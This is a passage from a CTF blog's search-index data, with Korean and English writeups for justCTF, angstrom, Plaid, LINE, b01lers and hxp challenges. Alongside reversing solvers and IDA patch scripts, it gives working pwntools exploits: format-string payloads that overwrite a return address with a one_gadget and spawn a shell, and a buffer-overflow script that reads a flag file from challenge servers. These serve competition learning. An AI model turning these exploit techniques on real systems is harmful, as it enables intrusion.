x:str(int(x[2:],2)),data)) return &#39;&#39;.join(data)data = unbin(f)out = &quot;list := []int{&quot;out += &#39;,&#39;.join(data)out += &quot;}&quot;print(out)list := []int{3,0,0,6,0,3,2,1,4,0,0,3,0,1,0,3,0,2,0,5,0,6,1,5,0,0,2,4,1,4,1,6,2,1,1,7,2,0,1,1,5,0,1,1,1,2,1,1,1,0,0,1,7,0,3,1,1,1,1,0,0,7,1,5,4,1,0,2,3,1,0,5,1,1,6,0,6,2,1,0,3,2,0,0,4,6,1,5,2,7,0,3,1,7,0,7,3,1,1,7,1,3,4,1,1}( used python because I don’t know golang )package mainimport ( &quot;fmt&quot; &quot;math/rand&quot; &quot;strconv&quot; &quot;strings&quot;)func main() { var i int64 = 0 list := []int{3, 0, 0, 6, 0, 3, 2, 1, 4, 0, 0, 3, 0, 1, 0, 3, 0, 2, 0, 5, 0, 6, 1, 5, 0, 0, 2, 4, 1, 4, 1, 6, 2, 1, 1, 7, 2, 0, 1, 1, 5, 0, 1, 1, 1, 2, 1, 1, 1, 0, 0, 1, 7, 0, 3, 1, 1, 1, 1, 0, 0, 7, 1, 5, 4, 1, 0, 2, 3, 1, 0, 5, 1, 1, 6, 0, 6, 2, 1, 0, 3, 2, 0, 0, 4, 6, 1, 5, 2, 7, 0, 3, 1, 7, 0, 7, 3, 1, 1, 7, 1, 3, 4, 1, 1} for i = 0; i &amp;lt; 0x100000; i++ { rand.Seed(i) m := make(map[int]int) dup := make([]int, 0) j := 0 for j &amp;lt; len(list) { rnd := rand.Intn(len(list)) flag := 0 for _, v := range dup { if v == rnd { flag = 1 } } if flag == 1 { continue } else { dup = append(dup, rnd) m[j] = rnd j++ } } unshuffled := make([]int, len(list)) for k, _ := range m { unshuffled[m[k]] = list[k] } strs := make([]string, len(unshuffled)) for i, number := range unshuffled { strs[i] = strconv.Itoa(number) } result := strs[0] for _, string := range strs[1:] { result += string } chunks := make([]string, 0) for j := 0; j &amp;lt; len(result); j += 3 { chunk, _ := strconv.ParseInt(result[j:j+3], 8, 8) chunk ^= 0x37 if chunk &amp;lt; 32 || chunk &amp;gt; 126 { break } chunks = append(chunks, string(chunk)) } if len(chunks) == len(list)/3 { if chunks[0] == &quot;j&quot; &amp;amp;&amp;amp; chunks[1] == &quot;u&quot; &amp;amp;&amp;amp; chunks[2] == &quot;s&quot; { fmt.Println(strings.Join(chunks, &quot;&quot;)) } } }}( that code is generated by chatGPT.. I don’t know about golang ) justCTF{1_h0pe_y0u_l1ke_mang0s_t00}" }, { "title": "(CTF) angstrom CTF 2023 noleek writeup", "url": "/posts/(ctf)-angstrom-ctf-2023/", "categories": "CTF", "tags": "writeup", "date": "2023-04-27 13:29:42 +0900", "snippet": "Date: April 27, 2023team: ST4RTnoleek - PWN#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define LEEK 32void cleanup(int a, int b, int c) {}int main(void) { setbuf(stdout, NULL); FILE* leeks = fopen(&quot;/dev/null&quot;, &quot;w&quot;); if (leeks == NULL) { puts(&quot;wtf&quot;); return 1; } printf(&quot;leek? &quot;); char inp[LEEK]; fgets(inp, LEEK, stdin); fprintf(leeks, inp); printf(&quot;more leek? &quot;); fgets(inp, LEEK, stdin); fprintf(leeks, inp); printf(&quot;noleek.\\\\n&quot;); cleanup(0, 0, 0); return 0;}주어진 소스코드를 보면, fprintf 함수로 FSB 를 두 번 사용할 수 있다. 하지만 /dev/null 파일의 fd 에 출력해서, 출력을 확인할 수는 없다.확인하려면, gdb 에서 leeks 변수의 버퍼를 확인하면 된다.스택에 있는 값을 잘 활용해서, __libc_start_main_ret 을 one_gadget 으로 덮으면 된다. cleanup 함수를 호출해서 원가젯 조건을 맞춰주는 것을 볼 수 있다.In the given source code, we can use FSB twice with the fprintf function. However, we can’t see the output by printing to fd in the /dev/null file.To do so, you can check the buffer of the leeks variable in gdb.Using the value on the stack, overwrite __libc_start_main_ret with one_gadget. You can see that the cleanup function is called to condition the original gadget. %1$p -&amp;gt; rsp %12$p -&amp;gt; __libc_start_main_ret %16$p -&amp;gt; rsp+XX -&amp;gt; rsp+YYinput %p %p ... and checked the index in gdbexploit flow 는 다음과 같다. overwrite stack pointer (rsp+YY) with rsp+56 to make rsp+XX point __libc_start_main_ret overwrite __libc_start_main_ret with __libc_start_main_ret + (distance to one_gadget) using rsp+XX (pointing rsp+8) rsp+XX -&amp;gt; %46$p ( local != server, check exploit file )from pwn import *#r = process(&quot;./noleek&quot;)r = remote(&quot;challs.actf.co&quot;,31400)context.log_level=&#39;debug&#39;#### Local (Ubuntu22.04)# 12=libc# 16=stack pointer$ 46=stack######## Debian Docker# libc = 0x23d0a# one_gadget = 0xc9620# diff = 678166# 13 = stack pointer# 12 = libc# 42 = stack####pay1 = &quot;%*1$c%56c%13$n&quot;pay2 = &quot;%*12$c%678166c%42$n&quot;r.sendlineafter(&quot;? &quot;,pay1)r.sendlineafter(&quot;? &quot;,pay2)r.sendline(&quot;id&quot;)r.sendline(&quot;id&quot;)r.sendline(&quot;ls&quot;)r.sendline(&quot;cat flag*&quot;)r.interactive()vfprintf_internal 을 분석해보면, %n 으로 write 할 때 int 값을 사용한다. 따라서 스택주소 4byte MSB!=1 &amp;amp;&amp;amp; libc주소 4byte MSB !=1 을 만족해야 정상적인 값이 덮힌다.또한, Ubuntu22.04, 문제서버에서 사용하는 Debian 스택구성이 살짝 달라서 Debian Docker 를 따로 빌드한 뒤 gdb 설치 후 디버깅해서 인덱스를 알아냈다.Analyzing vfprintf_internal, it uses int when writing to %n. Therefore, the stack address 4byte MSB!=1 &amp;amp;&amp;amp; libc address 4byte MSB !=1 must be satisfied to overwrite the correct value. So it requires some bruteforce ( 64 / 256 )Also, the Debian (Used in the server) stack is a little different from my local environment, so I built Debian Docker separately, installed gdb, and debugged to find the index." }, { "title": "(CTF) Plaid CTF 2023 Treasure Map, CSS writeup", "url": "/posts/(ctf)-plaid-ctf-2023/", "categories": "CTF", "tags": "writeup", "date": "2023-04-17 10:48:15 +0900", "snippet": "Date: April 16, 2023team: ST4RTThere were two javascript&amp;amp;css reversing challenges in Plaid CTF, I had a headache, so just solved two easy challengesTreasure Map - REVimport { go } from &quot;./0.js&quot;;import { go as fail } from &quot;./fail.js&quot;;const clear = () =&amp;gt; { const frame = document.querySelector(&quot;.frame&quot;); frame.classList.remove(&quot;success&quot;) frame.classList.remove(&quot;fail&quot;)}window.check = async () =&amp;gt; { clear(); let flag = document.querySelector(&quot;#input&quot;).value; if (!flag.startsWith(&quot;PCTF{&quot;) || !flag.endsWith(&quot;}&quot;)) { await fail(); return; } flag = flag.slice(5, -1); if (flag.length != 25) { await fail(); return; } window.buffer = flag.split(&quot;&quot;); go();}when user input, it checks string length inside FLAG format is equal to 25. copy input to window.buffer and call go() function at 0.jsthere are files named 0.js ~ 199.js, fail.js and success.jseach file (0.js ~ 199.js) is same file (maybe)it gets input from window.buffer.shift() and generate a array matches character to filename (X.js,fail.js,success), and imports the file that matches the user input and calls the go() function.the goal is find the correct path to import success.js...41: success.js,!...when I generate each files’s map, 41.js file only have the key, success.jsso, we can get the flag using backtrace starts from 41.js file to 0.js.However, when I wrote the code to trace a single path, there weren’t that many paths. So I just remove 0.js when i is less than 23. It could find correct path.const fs = require(&#39;fs&#39;);const b64 = `AB...9+/=`;const bti = b64.trim().split(&quot;\\\\n&quot;).reduce((acc, x, i) =&amp;gt; (acc.set(x, i), acc), new Map());const map = [];for(let i=0;i&amp;lt;200;i++){ data = fs.readFileSync(i+&#39;.js.map&#39;); data = data.toString(); const moi = fs.readFileSync(i+&#39;.js&#39;).toString(); const tg = JSON.parse(data); const fl = tg.mappings.split(&quot;;&quot;).flatMap((v, l) =&amp;gt;v.split(&quot;,&quot;).filter((x) =&amp;gt; !!x).map((input) =&amp;gt; input.split(&quot;&quot;).map((x) =&amp;gt; bti.get(x)).reduce((acc, i) =&amp;gt; (i &amp;amp; 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i &amp;amp; 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) =&amp;gt; (acc &amp;lt;&amp;lt; 5) + i, 0)]].map((x) =&amp;gt; typeof x === &quot;number&quot; ? x : x[0] &amp;amp; 0x1 ? (x[0] &amp;gt;&amp;gt;&amp;gt; 1) === 0 ? -0x80000000 : -(x[0] &amp;gt;&amp;gt;&amp;gt; 1) : (x[0] &amp;gt;&amp;gt;&amp;gt; 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) =&amp;gt; [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) =&amp;gt; [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) =&amp;gt; [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) =&amp;gt; x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) =&amp;gt; [tg.sources[s],moi.split(&quot;\\\\n&quot;).slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) =&amp;gt; ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join(&quot;\\\\n&quot;).trim()]); map.push(fl);}let last = &quot;41.js&quot;;let next;let flag = &quot;!&quot;;for(let i=0;i&amp;lt;24;i++){ // console.log(`${i} .. `); for(let j=0;j&amp;lt;map.length;j++){ for(let k=0;k&amp;lt;map[j].length;k++){ if(map[j][k][0] === last){ if(j==0&amp;amp;&amp;amp;i!=23){ // console.log(&quot;!!!!!!!!!!!!!!!!&quot;,map[j][k][1]); continue; } next = `${j}.js` // console.log(next); flag = map[j][k][1]+flag; if(j==0&amp;amp;&amp;amp;i==23){ // console.log(&quot;??????&quot;,map[j][k][1]); j=200; } break } } } last = next;}console.log(&quot;PCTF{&quot;+flag+&quot;}&quot;); PCTF{Need+a+map/How+about+200!}CSS - REV빨간색 화살표를 움직여 각 위치마다 [a-z_] 범위의 글자를 표시할 수 있다.You can move the red arrows to display letters in the [a-z_] range for each position.The correct phrase is obscured by something.3개의 글자가 하나의 div 에 묶여있고, 이러한 div 는 14개 있어 총 42글자다.There are 3 letters in a div, and there are 14 such divs, for a total of 42 characters.각 div 에는 아래, 위 화살표 6개가 정의되어있고 또 하나의 div 가 있다.해당 div 에는 각 문자들이 태그로 감싸져있다. 각 글자마다 height 가 다르다.첫 번째글자부터 순서대로 729, 27, 1 px 의 height 를 가진다. 아래 화살표를 누를 수록 height 가 증가한다. (Ex: aaa -&amp;gt; 0+0+0, bab -&amp;gt; 729+0+1, cab -&amp;gt; 729*2+0+1 )Each div has six down and up arrows defined and another div.In that div, each character is wrapped in a tag. Each letter has a different height.The first letter, in order, has a height of 729, 27, and 1 px. Pressing the up arrow increases the height. (Ex: aaa -&amp;gt; 0+0+0, bab -&amp;gt; 729+0+1, cab -&amp;gt; 729*2+0+1 )이렇게 증가된 height 는 Correct 를 가리고있는 4개의 div 박스의 height 를 결정하고,해당 div 박스 안의 svg 의 top 을 결정한다.This increased height determines the height of the four div boxes that cover the Correct,the top of the svg inside those div boxes.first div determines the height.The second div determines its top based on its height like this.All SVGs are white, but if you change the background color, there is a hole somewhere in the middle. We need to position the correct box over the hole. ( top: 60 )If you look at the background url used in each svg, when setting the svg with the d option, you will see 62V78~~ where 62 is the y-coordinate of the square that is pierced. Subtracting that value from 60 gives us the top value we need to match.from bs4 import BeautifulSoupfrom base64 import b64decode as atob, b64encode as btoaimport rewith open(&quot;css.html&quot;) as file: html = file.read()soup = BeautifulSoup(html, &quot;html.parser&quot;)# Extract all CSS selectors that contain a background:url propertyselectors = soup.select(&#39;[style*=&quot;background:url(&quot;]&#39;)# Extract the URL from each background:url propertyurls = []for selector in selectors: style = selector[&quot;style&quot;] url_start = style.index(&quot;url(&quot;) + len(&quot;url(&quot;) url_end = style.index(&quot;)&quot;, url_start) url = style[url_start+1:url_end-1] urls.append(url)# Process the extracted URLs (optional)for i, url in enumerate(urls): if &quot;?&quot; in url: urls[i] = url[:url.index(&quot;?&quot;)] if &quot;#&quot; in url: urls[i] = url[:url.index(&quot;#&quot;)]urls.sort()tops={}for url in urls: calc = int(atob(url.split(&#39;base64,&#39;)[1]).decode().split(&quot; &quot;)[7].split(&#39;V&#39;)[0])-2 calc = 60 - calc tops[url] = calcdef clear(calc): calc = calc.split(&quot;calc&quot;)[1] calc = calc.split(&quot;;&quot;)[0] calc = calc.replace(&quot;px&quot;, &quot;&quot;) return calcdef calculate(calc,x): calc = calc.replace(&quot;100%&quot;, str(x)) return eval(calc)s = &quot;abcdefghijklmnopqrstuvwxyz_&quot;height_pattern = r&quot;height:calc\\\\([^;]*\\\\);&quot;top_pattern = r&quot;top:calc\\\\([^;]*\\\\);&quot;image_pattern = r&quot;background:url\\\\(&#39;([^&#39;]+)&#39;\\\\)&quot;flag=&quot;PCTF{&quot;for left in range(200,200+120*14,120): tags = soup.select(&#39;[style*=&quot;position:absolute;top:0;left:%d&quot;] &amp;gt; div:nth-of-type(7) &amp;gt; div&#39;%left) init_list = [[i,j,k] for i in range(27) for j in range(27) for k in range(27)] for tag in tags: height_calc = clear(re.findall(height_pattern,tag.decode())[0]) top_calc = clear(re.findall(top_pattern,tag.decode())[0]) image_url = re.findall(image_pattern,tag.decode())[0] top = tops[image_url] next_list=[] for init in init_list: i,j,k = init v = 729*i+27*j+k if calculate(top_calc,calculate(height_calc,v)) == top: next_list.append([i,j,k]) init_list=next_list flag+=&quot;&quot;.join([s[i] for i in init_list[0]])flag+=&quot;}&quot;print(flag)The css parsing part was written by chatGPT.It takes the 4 divs of each div in groups of 3, gets the height and top attributes, and then bruteforces them by 3 bytes.I could have optimized this further, but I didn’t want to give myself a headache :&amp;lt; PCTF{youre_lucky_this_wasnt_a_threesat_instance}" }, { "title": "(CTF) LINE CTF 2023 fishing writeup", "url": "/posts/(ctf)-line-ctf-2023/", "categories": "CTF", "tags": "writeup", "date": "2023-03-26 12:22:50 +0900", "snippet": "Date: March 25, 2023rank: 60team: ST4RTfishing - rev ( 166 pt, 32 solve )In _main function, calls _do_global_ctors and functions at 0x140004100 are called in turn_main 함수에서 _do_global_ctors 함수를 호출 한 뒤, 0x140004100 에 있는 함수들이 차례로 호출된다.those function can’t be decompiled due to anti disassemble jumping to opcode+1 . so I wrote idapython script to fix that anti disassemble해당 함수들을 디컴파일해보면,opcode+1 로 점프해 디스어셈블러가 망가지는 것을 확인할 수 있다.idapython 으로 저렇게 생긴 부분들 정상적으로 디컴할 수 있게하는 스크립트 작성import reimport timefunctions = [(0x140001AE6,0x140001B12),(0x140001B13,0x140001ba3),(0x140001BA4,0x140001cde)]functions = [(0x1400020FA,0x14000222F)]functions = [(0x1400017d0,0x140001ae5)]pattern = r&quot;jmp.+(14[\\\\da-fA-F]{7}\\\\+1)&quot;for f in functions: start,end=f print(&#39;start&#39;,hex(start)) while start &amp;lt; end: create_insn(start) line = generate_disasm_line(start,0) print(line) if re.search(pattern,line): print(line) patch_byte(start,0x90) create_insn(start) start+=2 if(&#39;db&#39; in line): patch_byte(start,0x90) create_insn(start) start+=1 else: start+=1 print(&#39;end&#39;,hex(end))print(time.time())print(&#39;+&#39;*30)0x140001AE6 -&amp;gt; call AddVectoredExceptionHandler, handler → 0x1400017D00x140001B13 -&amp;gt; get gs register to detect debugger0x140001BA4 -&amp;gt; get gs register, GetProcessHeap to detect debuggerchecking Xref to _main, sub_1400020FA calls _mainafter calling the _main function, it gets input and creates a thread with input as an argument and call SetThreadContext to set Dr0~3 registersub_1400020FA 함수에서 _main 함수를 호출한 뒤, 문자열을 입력받고 해당 문자열을 인자로 스레드를 생성하는 루틴을 볼 수 있었다. 스레드를 생성하고, ThreadContext 설정Context.Dr0 -&amp;gt; xor 0x21 funcContext.Dr1 -&amp;gt; sub 0x22 funcContext.Dr2 -&amp;gt; xor 0x11 funcContext.Dr3 -&amp;gt; add 0x12 funcThread Handler call xor 0x21 with input call sub 0x22 with input call xor 0x11 with key call add 0x12 with key custom RC4 encryption compareSince there is only exit after detecting debugger, I can get RC4 key, patching exit to ret.디버거를 단순 탐지 후 exit 하는 것 밖에 없기 때문에, exit 패치하고 4 까지 가면, 사용되는 키 값을 알 수 있다. key : m4g1KaRp_ON_7H3_Hookhttps://ling.re/hardware-breakpoints/But when I xor, sub, RC4 my input, it doesn’t match to values in debugger그런데, thread handler 루틴 그대로 해도 input 을 암호화 한 결과가 디버깅할 때 값이랑 일치하지 않는다.it’s due to AddVectoredExceptionHandler, when the functions in Dr0~3 are called, the handler is executed first, then the function is executed이것은 위에서 AddVectoredExceptionHandler 으로 Debug Register 핸들러를 등록하고, Dr 레지스터를 설정해서 다른 루틴이 추가로 실행되기 때문이다.__int64 __fastcall sub_1400017D0(struct _EXCEPTION_POINTERS *ExceptionInfo){... if ( ExceptionInfo-&amp;gt;ExceptionRecord-&amp;gt;ExceptionCode != 0x80000004 ) return 0i64; if ( (ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Dr6 &amp;amp; 1) != 0 ) { Rcx = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rcx; Rdx = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rdx; for ( i = 0; i &amp;lt; Rdx; ++i ) *(i + Rcx) ^= i; } else if ( (ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Dr6 &amp;amp; 2) != 0 ) { v5 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rcx; v4 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rdx; for ( j = 0; j &amp;lt; v4; ++j ) *(j + v5) = (*(j + v5) &amp;gt;&amp;gt; 5) | (8 * *(j + v5)); } else if ( (ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Dr6 &amp;amp; 4) != 0 ) { v12 = 105; v7 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rcx; v6 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rdx; for ( k = 0; k &amp;lt; v6; ++k ) { *(k + v7) ^= v12; v12 *= v12; } } else if ( (ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Dr6 &amp;amp; 8) != 0 ) { v9 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rcx; v8 = ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Rdx; for ( m = 0; m &amp;lt; v8; ++m ) { *(m + v9) = 2 * *(m + v9) + 3 * m; *(m + v9) ^= m + 5; } } ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Dr6 = 0i64; ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;EFlags |= 0x10000u; return 0xFFFFFFFFi64;}Which BP is affected can be known according to each bit of Dr6.Context.Dr0 -&amp;gt; xor 0x21 -&amp;gt; xor idxContext.Dr1 -&amp;gt; sub 0x22 -&amp;gt; ror 5Context.Dr2 -&amp;gt; xor 0x11 -&amp;gt; v12=105, xor V with v12, v12 ** 2Context.Dr3 -&amp;gt; add 0x12 -&amp;gt; ( V * 2 + 3 * idx ) ^ ( idx + 5 )When I debug, some handlers didn’t work.So the input encryption routine is finally :디버깅 해보니까, input 암호화 할 때 작동하지 않는 핸들러도 있었다.그래서 input 암호화 루틴은 최종적으로 다음과 같다. xor with 0x21 sub 0x22 handler sub with 0x22 custom RC4 with key “m4g1KaRp_ON_7H3_Hook”solve.pykey=b&quot;m4g1KaRp_ON_7H3_Hook&quot;flag=list(map(lambda x:int(x,16),&quot;D0 BE 9F 5A BD F0 34 B5 D0 6F FB E2 99 BA AE D7 36 D5 2D C2 22 45 B0 03 9D 63 66 53 C7 28 CC 2A 2B 14 BB 09 9B E3 60 46 3A 00 00 00 00 00 00 00&quot;.split()))## RC4def PSK(t,key): for i in range(256): t[i] = i v6=0 for j in range(256): v6 = (t[j]+v6+key[j%len(key)])&amp;amp;0xff v4 = t[j] t[j]=t[v6] t[v6]=v4def enc(v7,data,out): v12 = 0 v11 = 0 for i in range(0x28): v12 = v12+1 v11 = (v7[v12]+v11)&amp;amp;0xff v9 = v7[v12] v7[v12]=v7[v11] v7[v11]=v9 v8 = v7[(v7[v12]+v7[v11])&amp;amp;0xff] out[i] = ((v11-24)^v8^data[i])&amp;amp;0xffdef xor_21(buf): for i in range(len(buf)): buf[i] ^= idef sub_22(buf): for i in range(len(buf)): ## ror 5 # buf[i] = ((buf[i]&amp;lt;&amp;lt;3)&amp;amp;0xff) | ((buf[i]&amp;gt;&amp;gt;5)&amp;amp;0x07) ## rol 5 buf[i] = ((buf[i]&amp;lt;&amp;lt;5)&amp;amp;0xff) | ((buf[i]&amp;gt;&amp;gt;3)&amp;amp;0x1f)def xor_11(buf): v12 = 105 for i in range(len(buf)): buf[i] ^= v12 v12 = v12**2 &amp;amp; 0xffdef add_12(buf): for i in range(len(buf)): buf[i] = 2 * buf[i] + 3 * i buf[i] &amp;amp;=0xff buf[i] ^= i+5table=[0]*256PSK(table,key)out=[0]*0x28enc(table,flag,out)out = list(map(lambda x:x+0x22&amp;amp;0xff,out))sub_22(out)out = list(map(lambda x:x^0x21,out))print(bytes(out))## LINECTF{e255cda25f1a8a634b31458d2ec405b6}" }, { "title": "(CTF) 2023 b01lers CTF writeup", "url": "/posts/(ctf)-b01lers-ctf-2023/", "categories": "CTF", "tags": "writeup", "date": "2023-03-20 14:59:39 +0900", "snippet": "Date: March 20, 2023rank: 19team: ST4RTcfifuuufuuuuu ( 398 pt, 13 solve )there are two files loader.pyc, a binarywhile 1: # res = ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs)) pid, status = os.waitpid(-1, 0) ssy = pnx(status) print(ssy) res = ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs)) print(hex(regs.rip)) if ssy[1] == &#39;WIFEXITED&#39;: break if ssy[2] == &#39;SIGSEGV&#39;: break if ssy[2] == &#39;SIGTRAP&#39;:&amp;gt; [&#39;0x57f&#39;, &#39;WIFSTOPPED&#39;, &quot;&#39;SIGTRAP&#39;&quot;, &#39;0&#39;]if I execute python code from uncompyle6, it doesn’t work due to the quote.Enclose comparing string with double quotesint 3adc [rax+XX]In binary, there are some opcodes that cause SEGFAULT next to int 3.int 3 → SIGTRAPif ssy[2] == &#39;SIGTRAP&#39;: res = ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs)) one_byte = mem_read(pid, regs.rip, 1)[0] if one_byte == 72: regs.rax = regs.rdi regs.rdi = regs.rsi ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs)) else: if one_byte == 17 or one_byte == 33 or one_byte == 49: offd = {17:0, 33:40, 49:72} vv = mem_read(pid, regs.rsp + offd[one_byte], 8) vv = struct.unpack(&#39;&amp;lt;Q&#39;, vv)[0] saved_addr.add(vv) regs.rip += 1 ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs)) else: if one_byte == 18 or one_byte == 34 or one_byte == 50: offd = {18:0, 34:40, 50:72} vv = mem_read(pid, regs.rsp + offd[one_byte], 8) vv = struct.unpack(&#39;&amp;lt;Q&#39;, vv)[0] if vv not in saved_addr: print(&#39;\\\\n\\\\n!!!Stack Violation Detected!!!\\\\n\\\\n&#39;) regs.rip = 0 ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs)) break saved_addr.remove(vv) regs.rip += 1 ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs)) res = ptrace(PTRACE_CONT, pid, 0, 0)In the loader, it handles SIGTRAP.it branches according to the 1byte next to int 3 opcode0x48 -&amp;gt; rax = rdi, rdi = rsi0x11,0x21,0x31 -&amp;gt; saved_addr.add([rsp+XX]), rip+=10x12,0x22,0x32 -&amp;gt; saved_addr.remove([rsp+XX]), if not exist, exit. rip+=1,control flow checkbinary routineread(0,0x601004,0x10)open(&quot;/dev/urandom&quot;) -&amp;gt; /dev/urandom string -&amp;gt; 0x601084[0x601000]+=1read(fd,0x601000+[0x601000]&amp;lt;&amp;lt;4+4],0x10) -&amp;gt; 0x601014write(1,random values,0x10)write xored data with random values: 0x400486read(0,[rsp+0x20],0x10)read(0,[rsp+0x10],...) -&amp;gt; input until 0xAwrite xored data [rsp+0x20], [rsp+0x10]in function 0x400486, BOF occurs. there is int 3 + 0x32 at the end of the function.loader check if [rsp+0x48] in saved_addr.There are two addresses at this time. original return 0x400546 and 0x4005e2.In 0x4005e2, it executes that routing again if eax ≠ 0.the return value of write always 1.repeating that routine, you can raise the address until 0x601084 ( /dev/urandom ) by increasing the input index (0x601000)modifying this filename to flag.txt, it reads flag as random values and prints.from pwn import *# r = process([&quot;/usr/bin/python3&quot;,&quot;/root/loader.py&quot;])r = remote(&quot;ctf.b01lers.com&quot;, 5215)for i in range(9): print(i) r.sendafter(&#39;?:\\n&#39;,b&#39;flag.txt&#39;.ljust(16,b&#39;\\x00&#39;)) r.sendafter(&#39;:\\n&#39;,b&#39;\\x00&#39;*16) r.sendline(b&#39;\\x00&#39;*0x38+p64(0x4005e2))r.interactive()by repeating 8 times, the string address 0x601084 (/dev/urandom) can be overwritten,in the 9th routine, it prints flag as random valuesbaby noah ( 334 pt, 25 solve )binary routine input map ( max : 8 * 24 ) execute opcodeopcode = map[row * m_col + col]col + flag1 (default 0)row += flag2 (default 0)miles += op+1# / dup / stack[idx] = stack[idx-1], idx ++! / test / stack[idx-1] = stack[idx-1] == 0* / mul / stack[idx-2] *= stack[idx-1], idx-=1+ / add / stack[idx-2] += stack[idx-1], idx-=1- / sub / stack[idx-2] -= stack[idx-1], idx-=1, / / div / stack[idx-2] /= stack[idx-1], idx-=1% / mod / stack[idx-2] %= stack[idx-1], idx-=1&amp;amp; / and / ..., / swap / stack[idx-2] = stack[idx-1]; stack[idx-1] = stack[idx-2]~ / pop / idx-=1. / putc / putc(stack[idx-1]): / printf / printf(&quot;%d&quot;,stack[idx-1])&amp;lt; / left / flag1 = -1&amp;gt; / right / flag1 = 1@ / return 1^ / up / flag2 = -1v / down / flag2 = 1_ / left_right / flag1 = stack[idx-1]==0 ? 1 : -1;| / up_down / flag2 = stack[idx-1] == 0 ? 1 : -1;g / load / stack[idx-2] = map[m_col * stack[idx-1] + stack[idx-2]]; idx-=1p / store / map[m_col * stack[idx-2] + stack[idx-3]] = stack[idx-1]; idx-=3default / stack[idx] = 0; idx++in every execute, add opcode+1 to miles.using that opcodes, make miles 0x31337 to print flag.input size is 8 * 24, so i need to construct a loop.first, push counter to stack stack : [ 0x00, X ], idx = 2 right to set flag1 = 1 default (counter → map[0][1]) default (dummy to idx++) default (dummy, in load row = 0) test to set stack[idx-1] = 1 load X payload : &amp;gt;XX!Xgsecond, using two rows, construct a loop right to start loop default to idx++ test to set stack[2] = 1 sub stack[1] default &amp;amp; pop ( dummy op to increase miles ) down left_right to check counter (stack[1]) == 0if counter==0, goto right to exitelse, goto left to execute remain loop count &amp;gt;X!-X~v^««&amp;lt;_@Adjust the value X to make the miles to 0x31337.from pwn import *#r=process([&quot;./babynoah&quot;,&quot;20&quot;,&quot;flag.txt&quot;])r=remote(&quot;babynoah.bctf23-codelab.kctf.cloud&quot;, 1337)payload = b&quot;&amp;gt;\\xe4\\xe4!\\xffg&amp;gt;\\xfe!-\\x00~v\\n&quot;payload +=b&quot;\\xff\\xff\\xff\\xff\\xff\\xff^&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;_@&quot;r.sendline(payload)pause()r.sendline()r.interactive()by default, X to 0xff and adjusted the rest appropriately" }, { "title": "(CTF) 2022 hxp required writeup", "url": "/posts/(ctf)-hxp-ctf-2022-075e6a0688a84a00b6cae02d2ca19fcb/", "categories": "CTF", "tags": "writeup", "date": "2023-03-14 15:15:52 +0900", "snippet": "rank: 68required ( 182 pt, 43 solve )f=[...require(&#39;fs&#39;).readFileSync(&#39;./flag&#39;)]require(&#39;./28&#39;)(753,434,790)require(&#39;./157&#39;)(227,950,740)require(&#39;./736&#39;)(722,540,325)require(&#39;./555&#39;)(937,26,229)require(&#39;./394&#39;)(192,733,981)require(&#39;./446&#39;)(635,887,709)require(&#39;./394&#39;)(751,446,832)...require(&#39;./37&#39;)(f)It requires numerous .js files and calls exported functions.Some of those functions modify __proto__ to change the require path ( i’m not sure it really works ), while others do operations that modify flagimport osimport re## get current files *.jsfiles = os.listdir(os.getcwd())new_files = []## get each file executionfor file in files: if file.endswith(&#39;.js&#39;): with open(file, &#39;r&#39;) as f: execution = f.read() ## if f\\[.\\] is in execution if re.search(r&#39;f\\[.\\]&#39;, execution): new_files.append(file)for file in new_files: with open(file, &#39;r&#39;) as f: contents = f.read() execution = contents[:] execution = re.findall(r&#39;f\\[.\\].*\\)$&#39;, execution)[0][:-1] execution = re.sub(r&#39;(f\\[(.)\\])&#39;,r&#39;f[${\\2}]&#39;,execution) print(execution) with open(file, &#39;w&#39;) as f: data = contents[:-1] + &quot;,console.log(`&quot;+execution+&quot;`))&quot; f.write(data)The files that modify the flag use f variable.So I modify those .js files to print each operationsfiles node required.js f[17]+=f[5],f[17]&amp;amp;=0xfff[29]=~f[29]&amp;amp;0xfff[3]^=f[11]f[6]=f[6]&amp;lt;&amp;lt;7&amp;amp;0xff|f[6]&amp;gt;&amp;gt;1f[2]=~f[2]&amp;amp;0xfff[20]=f[20]&amp;lt;&amp;lt;7&amp;amp;0xff|f[20]&amp;gt;&amp;gt;1f[23]=f[23]^(f[23]&amp;gt;&amp;gt;1)...It prints well## + -&amp;gt; -## - -&amp;gt; +## ~ -&amp;gt; ~## f[x]^=f[y] -&amp;gt; f[x]^=y## ror -&amp;gt; rol## rol -&amp;gt; ror## 